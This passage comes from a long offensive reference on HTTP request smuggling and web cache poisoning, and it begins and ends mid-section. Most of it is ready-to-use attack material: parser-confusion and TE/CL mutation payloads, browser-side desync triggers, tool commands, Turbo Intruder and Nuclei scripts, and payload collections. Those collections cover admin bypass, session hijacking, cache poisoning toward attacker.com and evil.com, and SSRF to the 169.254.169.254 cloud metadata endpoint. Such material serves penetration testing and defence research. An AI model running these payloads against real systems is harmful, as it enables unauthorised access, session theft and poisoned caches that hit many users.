# The HTTP/2 stream bypasses front-end WebSocket restrictions
```

---

## Parser Confusion Payloads

### Theory

**Parser Confusion** exploits differences in how different HTTP implementations parse the same malformed request. These discrepancies can be used to bypass WAFs, evade detection, and achieve desync.

### Content-Length Confusion

```http
# Multiple Content-Length headers
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Content-Length: 100

12345
```

**Behaviors**:
- Some servers use the first `Content-Length` (5 bytes)
- Some use the last `Content-Length` (100 bytes)
- Some reject the request entirely
- Some ignore `Content-Length` if `Transfer-Encoding` is present

### Transfer-Encoding Value Confusion

```http
# Non-standard TE values
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked, identity
Transfer-Encoding: x\x0bchunked
```

**Behaviors**:
- Some servers accept `chunked, identity` and process chunked
- Some reject non-standard values and fall back to CL
- Some process the first valid TE value
- Some process the last TE value

### Line Ending Confusion

```http
# LF-only vs CRLF
POST / HTTP/1.1

Host: target.com

Content-Length: 5


12345
```

**Behaviors**:
- Strict parsers require CRLF (`\r\n`)
- Lenient parsers accept LF-only (`\n`)
- Some accept CR-only (`\r`)
- Mixed line endings can cause boundary confusion

### Chunk Size Parsing Confusion

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0005
12345
0

```

**Behaviors**:
- Some parsers accept leading zeros in chunk size
- Some treat `0005` as invalid
- Some parse `0` as the chunk size and treat `005` as data

### Header Name Confusion

```http
# Various header name mutations
 Transfer-Encoding: chunked      # Leading space
Transfer-Encoding	: chunked      # Tab before colon
Transfer-Encoding:\x0bchunked     # VT after colon
transfer-encoding: chunked       # Lowercase
TRANSFER-ENCODING: chunked       # Uppercase
```

### HTTP/1.0 vs HTTP/1.1 Confusion

```http
# HTTP/1.0 with keep-alive
POST / HTTP/1.0
Host: target.com
Content-Length: 5
Connection: keep-alive

12345
```

**Behaviors**:
- HTTP/1.0 doesn't support chunked encoding by default
- `Connection: keep-alive` is required for persistent connections
- Some proxies downgrade HTTP/1.1 to HTTP/1.0 and strip TE headers

---

## Browser Quirks

### Theory

Browsers have specific behaviors that can be exploited in desync attacks. Understanding these quirks is essential for client-side desync exploitation.

### Fetch API Quirks

```javascript
// fetch() with mode: 'no-cors' sends cookies but doesn't read response
fetch('https://target.com/', {
    method: 'POST',
    body: crafted_body,
    mode: 'no-cors',
    credentials: 'include'
});

// fetch() with mode: 'cors' on redirect throws error (triggering catch)
fetch('https://target.com/redirect', {
    method: 'POST',
    body: crafted_body,
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    // Redirect blocked by CORS - navigate manually
    location = 'https://target.com/';
});
```

### XMLHttpRequest Quirks

```javascript
// XHR sends cookies by default
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/', true);
xhr.withCredentials = true;
xhr.send(crafted_body);
```

### Form Submission Quirks

```html
<!-- Form submission sends Content-Type: application/x-www-form-urlencoded -->
<form action="https://target.com/" method="POST" id="desync-form">
    <input type="hidden" name="body" value="GET /admin HTTP/1.1...">
</form>
<script>document.getElementById('desync-form').submit();</script>
```

### Browser Encoding Behaviors

| Character | Browser Encoding | Server Decoding |
|-----------|-----------------|-----------------|
| Space | `%20` or `+` | May decode differently |
| `"` | `%22` | Some servers don't decode |
| `<` | `%3C` | Some servers don't decode |
| `\r` | `%0D` | May be stripped by WAF |
| `\n` | `%0A` | May be stripped by WAF |

### Safari HSTS Upgrade Quirk

Safari automatically upgrades HTTP to HTTPS if the domain is in the HSTS cache. This can be exploited to bypass mixed-content protections:

```http
# Ghost CMS redirect uses HTTP
Location: http://attacker.com/malicious.css

# If attacker.com is in Safari HSTS cache, it upgrades to HTTPS
# Bypassing mixed-content blocking for CSS injection
```

### Edge Mixed-Content Bypass

Edge allows 302 redirects to HTTPS URLs to bypass mixed-content protections for CSS/JS resources.

---

## Gadget Chains

### Theory

**Gadgets** are benign application features that become dangerous when combined with request smuggling. Finding good gadgets is crucial for high-impact exploitation.

### Reflection Gadgets

**Definition**: Endpoints that reflect user input in the response body.

```http
# Search endpoint reflecting query parameter
GET /search?q=CANARY HTTP/1.1
Host: target.com

# Response contains: <div>Results for: CANARY</div>
```

**Smuggling Chain**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /search?q= HTTP/1.1
Host: target.com
Content-Length: 5

x=
```

When victim's request arrives: `GET /search?q=x=GET /home HTTP/1.1...Cookie: session=victim`
The victim's entire request gets reflected in the search results.

### Open Graph Gadgets

```http
# Meta tag reflecting URL
<meta property="og:url" content="https://target.com/page"/>
```

**Chain**: Poison the `og:url` to point to attacker.com. When shared on social media, the poisoned URL gets distributed.

### JSONP Gadgets

```http
# JSONP endpoint
GET /jsonp?callback=legit HTTP/1.1
Host: target.com

# Response: legit({"data": "value"});
```

**Chain**: Smuggle a request with `callback=alert(1)` to execute arbitrary JavaScript.

### Resource File Gadgets (CSS/JS)

```http
# CSS import reflecting query string
GET /style.css?x=a);@import... HTTP/1.1

# Response: @import url(/site/style.css?x=a);@import...
```

**Chain**: Inject malicious CSS that exfiltrates data from pages importing the poisoned stylesheet.

### Cookie Gadgets

```http
# Server reflecting cookie values
Set-Cookie: locale=en; domain=target.com
```

**Chain**: Smuggle a request with `X-Forwarded-Host: attacker.com` to set cookies for the attacker's domain.

### Redirect Gadgets

```http
# Redirect reflecting query parameters
GET /login?return_to=/dashboard HTTP/1.1

# Response: 302 Location: /login/?return_to=/dashboard
```

**Chain**: Poison the redirect to send users to attacker.com after login.

### Translation File Gadgets

```http
# i18n endpoint
GET /api/i18n/en HTTP/1.1
Host: target.com

# Response: {"Show more": "Show more"}
```

**Chain**: Poison the translation file: `{"Show more": "<svg onload=alert(1)>"}`. Any page showing "Show more" executes the payload.

---

## Real World Case Studies

### Case Study 1: Mozilla SHIELD System Hijacking

**Researcher**: James Kettle (PortSwigger)
**Target**: Mozilla Firefox SHIELD system
**Technique**: Cache Poisoning + X-Forwarded-Host

**Attack**:
```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: attacker.com
```

**Impact**: 
- Poisoned the SHIELD recipe endpoint
- All Firefox users (tens of millions) would fetch recipes from attacker's server
- Could force mass installation of extensions
- Awarded $1,000 bounty

### Case Study 2: GitHub Fat GET Cache Poisoning

**Researcher**: James Kettle (PortSwigger)
**Target**: GitHub
**Technique**: Fat GET + Cache Poisoning

**Attack**:
```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Impact**:
- Poisoned cache to change any parameter value
- Could redirect abuse reports to arbitrary users
- GitHub patched and awarded $10,000 bounty

### Case Study 3: Cloudflare Blog Ghost CMS Hijacking

**Researcher**: James Kettle (PortSwigger)
**Target**: blog.cloudflare.com (Ghost CMS)
**Technique**: Route Poisoning + Cache Poisoning

**Attack**:
```http
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: attacker.ghost.io
```

**Impact**:
- Redirected all blog resources to attacker-controlled domain
- Full site takeover for Safari/Edge users via mixed-content bypass
- Reported via Binary's bug bounty program

### Case Study 4: Firefox Update System DoS

**Researcher**: James Kettle (PortSwigger)
**Target**: download.mozilla.org
**Technique**: Cache Key Normalization

**Attack**:
```http
GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
Host: download.mozilla.org
```

**Impact**:
- Encoded `?` (`%3f`) broke the redirect
- Nginx URL-decoded the cache key, making it match legitimate requests
- Could disable Firefox updates globally
- Mozilla patched within 24 hours

### Case Study 5: Adobe Blog Internal Cache Poisoning

**Researcher**: James Kettle (PortSwigger)
**Target**: theblog.adobe.com
**Technique**: Internal Cache Poisoning (WP Rocket)

**Attack**:
```http
GET /access-the-power-of-adobe-acrobat HTTP/1.1
Host: theblog.adobe.com
X-Forwarded-Host: attacker.com
```

**Impact**:
- WP Rocket Cache (application-level) poisoned every page
- All links on every page pointed to attacker.com
- No way to "undo" the poisoning
- Adobe resolved in under 20 minutes

### Case Study 6: DoD Intelligence Website Blind Cache Poisoning

**Researcher**: James Kettle (PortSwigger)
**Target**: US DoD internal site
**Technique**: Blind Internal Cache Poisoning

**Attack**:
- External access caused server-level redirect to intranet
- DoS technique broke the redirect, triggering error page
- Error page poisoned internal cache
- Internal admin panel started sending traffic to researcher's server

**Impact**:
- Accessed internal administration panel without direct network access
- Demonstrated blind cache poisoning on internal systems

---

## Fuzzing Payloads

### Detection Payloads

```http
# Basic CL.TE detection
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Basic TE.CL detection  
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# TE.TE detection with obfuscation
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Exhaustive Mutation Payloads

```python
# Python script to generate exhaustive TE mutations

def generate_mutations():
    mutations = []

    # Whitespace characters
    whitespace = [
        (0x01, "SOH"), (0x04, "EOT"), (0x08, "BS"),
        (0x09, "TAB"), (0x0a, "LF"), (0x0b, "VT"),
        (0x0c, "FF"), (0x0d, "CR"), (0x1f, "US"),
        (0x20, "SPACE"), (0x7f, "DEL"), (0xa0, "NBSP"),
        (0xff, "0xFF")
    ]

    for code, name in whitespace:
        c = chr(code)
        mutations.append((f"midspace-{name}", f"Transfer-Encoding:{c}chunked"))
        mutations.append((f"postspace-{name}", f"Transfer-Encoding{c}: chunked"))
        mutations.append((f"prespace-{name}", f"{c}Transfer-Encoding: chunked"))
        mutations.append((f"endspace-{name}", f"Transfer-Encoding: chunked{c}"))

    # Line ending mutations
    mutations.append(("rxprespace-LF", "X: X\r\nTransfer-Encoding: chunked"))
    mutations.append(("xnprespace-LF", "X: X\nTransfer-Encoding: chunked"))
    mutations.append(("endspacerx-LF", "Transfer-Encoding: chunked\r\nX: X"))
    mutations.append(("endspacexn-LF", "Transfer-Encoding: chunked\nX: X"))

    return mutations

# Generate payload templates
for name, te_header in generate_mutations():
    payload = f"""POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
{te_header}

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

"""
    print(f"# Mutation: {name}")
    print(payload)
```

### HTTP/2 Fuzzing Payloads

```http
# HTTP/2 header injection fuzzing
:method POST
:path /
:authority {{Hostname}}
:scheme https
header

GET /admin HTTP/1.1: injected

# HTTP/2 pseudo-header fuzzing
:method POST
:path /
Host: attacker.com
:authority {{Hostname}}
:scheme https

# HTTP/2 body smuggling
:method POST
:path /
:authority {{Hostname}}
:scheme https
content-length: 0

GET /flag HTTP/1.1
Host: {{Hostname}}
```

---

## Automation Workflows

### Burp Suite + HTTP Request Smuggler Extension

```
1. Install HTTP Request Smuggler from BApp Store
2. Right-click any request -> "Launch Smuggle probe"
3. Wait for probe completion ("Completed 1 of 1")
4. If vulnerability found:
   - Burp Pro: Check Dashboard for scan issues
   - Burp Community: Copy request from output tab to Repeater
5. Right-click -> "Smuggle attack (CL.TE)" or "Smuggle attack (TE.CL)"
6. Edit the 'prefix' variable to craft your exploit
7. Click 'Attack' and observe responses
```

### Smuggler CLI Automation

```bash
# Single target scan
python3 smuggler.py -u https://target.com/

# Multiple targets from file
cat targets.txt | python3 smuggler.py

# With custom virtual host
python3 smuggler.py -u https://target.com/ -v internal.target.com

# Fast scan (exit on first finding)
python3 smuggler.py -u https://target.com/ -x

# Custom timeout for slow connections
python3 smuggler.py -u https://target.com/ -t 10

# Quiet mode (only log findings)
python3 smuggler.py -u https://target.com/ -q

# Custom config (exhaustive mutations)
python3 smuggler.py -u https://target.com/ -c config/exhaustive.py
```

### http2smugl Automation

```bash
# Detection scan
http2smugl detect https://target.com/

# Send custom HTTP/2 request
http2smugl request https://target.com/ \
  "transfer_encoding:chunked" \
  "content-length:0"

# With HTTP/3 support
http2smugl detect --try-http3 https://target.com/

# Custom header with newline injection
http2smugl request https://target.com/ \
  "header:value\r\n\r\nGET /admin HTTP/1.1"
```

### h2csmuggler Automation

```bash
# Scan list of endpoints
./h2csmuggler.py --scan-list urls.txt --threads 5

# Test single endpoint
./h2csmuggler.py -x https://target.com/api/ --test

# Exploit with custom request
./h2csmuggler.py -x https://target.com \
  -X POST -d '{"role":"admin"}' \
  -H "Content-Type: application/json" \
  http://backend/api/users

# Brute-force internal paths
./h2csmuggler.py -x https://target.com \
  -i wordlist.txt http://localhost/
```

### Turbo Intruder Desync Scripts

```python
# DesyncAttack_CLTE.py (from defparam/tiscripts)
# Use with Burp's Turbo Intruder after finding CL.TE vulnerability

from urllib.parse import quote

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    prefix = '''GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x='''

    attack = target.req.replace('G', prefix)
    engine.queue(attack)
    engine.queue(target.req)


def handleResponse(req, interesting):
    table.add(req)
```

---

## Recon Methodology

### Phase 1: Infrastructure Mapping

```bash
# Identify front-end technologies
httpx -u https://target.com -tech-detect

# Check for CDN/WAF
wafw00f https://target.com

# Identify server headers
curl -I https://target.com | grep -i "server\|via\|x-cache\|cf-ray"

# Check HTTP/2 support
curl --http2 -I https://target.com

# Check for H2C upgrade support
curl -i -X GET \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  https://target.com/
```

### Phase 2: Endpoint Discovery

```bash
# Find POST endpoints (smuggling requires POST usually)
katana -u https://target.com -d 3 | grep -i "post"

# Find endpoints with body reflection
# Look for search, contact forms, API endpoints

# Find cacheable endpoints
# Look for static resources, API responses with Cache-Control
```

### Phase 3: Desync Detection

```bash
# Step 1: Send detection payload
# Step 2: Send follow-up request
# Step 3: Check for anomalies (timeout, error, unexpected response)

# Automated detection with Smuggler
cat endpoints.txt | python3 smuggler.py -q

# Manual confirmation with netcat
# Save payload to file and send:
cat payload.txt | nc target.com 80
```

### Phase 4: Exploitation Chain Building

```
1. Identify the desync variant (CL.TE, TE.CL, TE.TE, HTTP/2)
2. Find a reflection gadget (search endpoint, error page, etc.)
3. Confirm response/request queue poisoning
4. Build the exploitation chain:
   - For cache poisoning: Find cacheable endpoint + gadget
   - For session hijacking: Find logging/reflective endpoint
   - For SSRF: Find internal service accessible from back-end
   - For auth bypass: Find admin endpoints blocked by front-end
5. Test the chain in a controlled manner
6. Document the full exploitation flow
```

### Phase 5: Impact Assessment

```
- Can you access admin endpoints? (Auth bypass)
- Can you steal other users' sessions? (Session hijacking)
- Can you poison the cache? (Cache poisoning)
- Can you access internal services? (SSRF)
- Can you cause DoS? (Resource exhaustion)
- Can you execute JavaScript in victim's browser? (XSS via desync)
```

---

## Nuclei Templates

### Basic CL.TE Template

```yaml
id: CL-TE-http-smuggling

info:
  name: HTTP request smuggling, basic CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked

      0

      G
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked

      0

      G

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### Basic TE.CL Template

```yaml
id: TE-CL-http-smuggling

info:
  name: HTTP request smuggling, basic TE.CL vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked

      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15

      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked

      5c
      GPOST / HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15

      x=1
      0

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Unrecognized method GPOST")'
```

### Frontend Bypass CL.TE Template

```yaml
id: smuggling-bypass-front-end-controls-cl-te

info:
  name: HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10

      x=
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 116
      Transfer-Encoding: chunked

      0

      GET /admin HTTP/1.1
      Host: localhost
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 10

      x=

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "/admin/delete?username=carlos")'
```

### Differential Response CL.TE Template

```yaml
id: confirming-cl-te-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked

      0

      GET /404 HTTP/1.1
      X-Ignore: X
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 35
      Transfer-Encoding: chunked

      0

      GET /404 HTTP/1.1
      X-Ignore: X

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```

### Differential Response TE.CL Template

```yaml
id: confirming-te-cl-via-differential-responses-http-smuggling

info:
  name: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked

      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15

      x=1
      0
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-length: 4
      Transfer-Encoding: chunked

      5e
      POST /404 HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 15

      x=1
      0

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code==404'
```

### Nuclei Template Usage Commands

```bash
# Run CL.TE detection
nuclei -u https://target.com -t CL-TE-http-smuggling.yaml

# Run TE.CL detection
nuclei -u https://target.com -t TE-CL-http-smuggling.yaml

# Run all smuggling templates
nuclei -u https://target.com -t http/misconfiguration/request-smuggling/

# With rawhttp engine (required for smuggling)
nuclei -u https://target.com -t template.yaml -unsafe

# Pipeline mode for response queue poisoning testing
nuclei -u https://target.com -t pipeline-template.yaml -unsafe -pipeline
```

---

## Tools and Scanners

### HTTP Request Smuggler (Burp Extension)

**Author**: PortSwigger (James Kettle)
**Type**: Burp Suite Extension
**Features**:
- Root-cause detection of parsing discrepancies
- CL.TE and TE.CL detection with timeout-based confirmation
- HTTP/2 request smuggling detection
- Client-side desync detection
- Header smuggling and removal detection
- Connection state manipulation
- Automated exploit generation with Turbo Intruder
- False positive reduction

**Installation**:
```
Burp Suite -> Extender -> BApp Store -> Search "HTTP Request Smuggler" -> Install
```

**Usage**:
```
1. Right-click request -> "Launch Smuggle probe"
2. Wait for completion
3. Right-click -> "Smuggle attack (CL.TE)" or "Smuggle attack (TE.CL)"
4. Edit 'prefix' variable
5. Click 'Attack'
```

### Smuggler (Python CLI)

**Author**: defparam
**Type**: Python 3 CLI tool
**Features**:
- Fast scanning with configurable mutations
- Support for custom configuration files
- Automatic payload dumping
- Piped input for bulk scanning

**Installation**:
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h
```

**Configuration Files**:
- `default.py`: Fast, basic mutations
- `doubles.py`: Niche, slower mutations
- `exhaustive.py`: Very slow, comprehensive mutations

### http2smugl (Go)

**Author**: neex (Emil Lerner)
**Type**: Go CLI tool
**Features**:
- HTTP/2 to HTTP/1.1 downgrade detection
- Header injection via spaces, underscores, newlines, UTF-8
- HTTP/3 experimental support
- Distinguishable response detection algorithm

**Installation**:
```bash
go install github.com/neex/http2smugl@latest
```

**Usage**:
```bash
# Detection
http2smugl detect https://target.com/

# Custom request
http2smugl request https://target.com/ "header:value"

# With HTTP/3
http2smugl detect --try-http3 https://target.com/
```

### h2csmuggler (Python)

**Author**: BishopFox (the-bumble)
**Type**: Python 3 CLI tool
**Features**:
- H2C upgrade detection
- HTTP/2 tunneling through HTTP/1.1 proxies
- Internal endpoint brute-forcing
- SSRF exploitation via H2C

**Installation**:
```bash
pip3 install h2
./h2csmuggler.py -h
```

**Usage**:
```bash
# Scan endpoints
./h2csmuggler.py --scan-list urls.txt --threads 5

# Test single endpoint
./h2csmuggler.py -x https://target.com/api/ --test

# Exploit
./h2csmuggler.py -x https://edgeserver http://backend/flag
```

### Turbo Intruder

**Author**: PortSwigger (James Kettle)
**Type**: Burp Suite Extension
**Features**:
- High-speed HTTP attack engine
- Desync attack scripting
- Pipeline and connection state manipulation
- Custom Python scripting for complex chains

**Desync Scripts**:
- `DesyncAttack_CLTE.py`: CL.TE exploitation
- `DesyncAttack_TECL.py`: TE.CL exploitation

### Param Miner

**Author**: PortSwigger (James Kettle)
**Type**: Burp Suite Extension
**Features**:
- Automatic unkeyed parameter discovery
- Cache buster injection
- Cache-key issue detection
- Fat GET vulnerability detection

### Additional Tools

| Tool | Author | Purpose |
|------|--------|---------|
| `simple-http-smuggler-generator` | dhmosfunk | Burp Suite practitioner exam helper |
| `tiscripts` | defparam | Turbo Intruder desync scripts |
| `CursedChrome` | mandatoryprogrammer | Chrome extension for request manipulation |
| `postMessage-tracker` | fransr | postMessage vulnerability tracking |
| `pp-finder` | yeswehack | Prototype pollution finder |

---

## Advanced Research

### HTTP/1.1 Must Die: The Desync Endgame

**Researcher**: James Kettle (PortSwigger, 2025)
**Key Findings**:
- Parser discrepancy detection bypasses widespread desync defenses
- Version 3.0 of HTTP Request Smuggler adds root-cause detection
- Many "patched" systems remain vulnerable to novel mutations
- The attack surface extends beyond traditional CL/TE/TE.TE

### Browser-Powered Desync Attacks

**Researcher**: James Kettle (PortSwigger, 2022)
**Key Findings**:
- Client-side desync requires no direct HTTP access
- JavaScript fetch() can trigger desync on vulnerable servers
- Redirect + CORS error handling enables exploitation chains
- Response concatenation enables XSS without browser quirks

### HTTP Desync Attacks: Request Smuggling Reborn

**Researcher**: James Kettle (PortSwigger, 2019)
**Key Findings**:
- HTTP/2 downgrade introduces new desync vectors
- Response queue poisoning enables credential theft
- Request queue poisoning enables auth bypass
- Cache poisoning + desync = persistent XSS

### Web Cache Entanglement

**Researcher**: James Kettle (PortSwigger, 2020)
**Key Findings**:
- Cache key transformations enable novel attacks
- URL normalization differences between cache and origin
- Parameter cloaking via parsing discrepancies
- Internal cache poisoning (WP Rocket, etc.)
- Cache key injection on Akamai, Cloudflare

### Practical Web Cache Poisoning

**Researcher**: James Kettle (PortSwigger, 2018)
**Key Findings**:
- Unkeyed inputs (headers, cookies) can poison caches
- X-Forwarded-Host, X-Original-URL, X-Rewrite-URL gadgets
- Fat GET requests bypass cache key inclusion of body
- Route poisoning via header-based internal routing

### WAFFLED Research

**Researchers**: Academic paper (2025)
**Key Findings**:
- Content parsing discrepancies between WAFs and frameworks
- multipart/form-data, application/xml, application/json bypasses
- Tested against Google Cloud Armor, Cloudflare, AWS WAF, Azure WAF, ModSecurity
- Frameworks: Flask, Laravel, FastAPI, Gin, Express, Spring Boot

---

## Bug Bounty Writeups

### Writeup 1: GitHub $10,000 - Fat GET Cache Poisoning

**Researcher**: James Kettle
**Program**: GitHub
**Severity**: High
**Technique**: Fat GET + Cache Poisoning

```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Impact**: Could change any parameter value on cacheable pages
**Lesson**: Varnish + Rails behind Cloudflare = vulnerable to fat GET

### Writeup 2: Mozilla $1,000 - SHIELD System Hijacking

**Researcher**: James Kettle
**Program**: Mozilla
**Severity**: Medium (disagreement on severity)
**Technique**: Cache Poisoning + X-Forwarded-Host

```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: attacker.com
```

**Impact**: Could direct all Firefox users to attacker-controlled recipes
**Lesson**: Even "signed" systems can be dangerous at scale

### Writeup 3: Zendesk - Login CSRF via Fat GET

**Researcher**: James Kettle
**Program**: Zendesk
**Severity**: High
**Technique**: Fat GET + Login CSRF

```http
GET /en-us/signin HTTP/1.1
Host: example.zendesk.com
Content-Length: 200

return_to=/access/logout?return_to=/./access/return_to?flash_digest=secret-token
```

**Impact**: Users logging in would be redirected to attacker's account
**Lesson**: Rails + Cloudflare = vulnerable to fat GET attacks

### Writeup 4: Cloudflare - Query String Unkeyed DoS

**Researcher**: James Kettle
**Program**: Cloudflare (reported via client)
**Severity**: Medium
**Technique**: Cache Poisoning + Redirect DoS

```http
GET /login?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
```

**Impact**: Could take down Cloudflare login page globally
**Lesson**: Even security companies have cache key issues

### Writeup 5: Red Hat - Basic Cache Poisoning

**Researcher**: James Kettle
**Program**: Red Hat
**Severity**: High
**Technique**: Basic Cache Poisoning + XSS

```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
```

**Impact**: XSS on every page via Akamai cache poisoning
**Lesson**: "Cache-Control: no-cache" doesn't mean not cached

---

## Payload Collections

### CL.TE Payload Collection

```http
# Detection
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Admin bypass
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

# Session hijacking
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 55
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: {{Hostname}}
Content-Length: 20

search=

# Cache poisoning
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 130
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Host: attacker.com
Content-Length: 5

x=1

# SSRF
POST / HTTP/1.1
Host: {{Hostname}}
Content-Length: 120
Transfer-Encoding: chunked

0

GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: 169.254.169.254
Content-Length: 5

x=
```

### TE.CL Payload Collection

```http
# Detection
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Admin bypass
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Reflection gadget
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
POST /search HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
0


# Cache poisoning
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7b
GET / HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Host: evil.com
Content-Length: 5

x=1
0

```

### TE.TE Payload Collection

```http
# Space before colon
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding : chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Tab after colon
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding:	chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


# Multiple TE headers
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
